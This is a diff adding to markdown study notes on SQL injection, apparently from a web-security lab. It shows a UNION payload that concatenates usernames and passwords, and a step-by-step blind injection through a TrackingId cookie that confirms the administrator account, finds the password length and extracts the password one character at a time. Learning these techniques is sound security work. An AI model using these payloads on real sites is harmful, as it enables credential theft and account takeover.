@@ -190,8 +190,25 @@ Pull data out
 
 ### SQL injection UNION attack, retrieving multiple values in a single column
 
-We can concatenate two values into one to pull from a single column
+We can concatenate two values into one to pull from a single column. More concatentation syntax exists in the cheat sheet.
 
 ```
 ' UNION SELECT NULL, username||'~'||password FROM users--
 ```
+
+## Blind
+
+### Blind SQL injection with conditional responses
+
+There exists a TrackingId cokie value when visiting the site. 
+- When we go to the site we see a `Welcome back` message in the website.
+- If we add `' AND '1'='1` to the cookie we still see this message still.
+- Now place `' AND '1'='2` and notice we don't get a message back, this means we can craft to identify values in the db
+- Now we use this query `' AND (SELECT 'a' FROM users LIMIT 1)='a`
+- This confirms that there is a users table
+- Now we can use this query to identify that the administrator exists `' AND (SELECT 'a' FROM users WHERE username='administrator')='a`
+- Verifying password length: `' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a`
+- Continuing to find password length `' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a` increase this until we get a response without the message back
+- Now send it to intruder and do this, fuzzing the a so we can find what the first letter of the password is `' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§`
+- Now we just change the first integer in the password section like this: `' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='§a§`
+- test these offsets until you get to the end of the password and you will have one
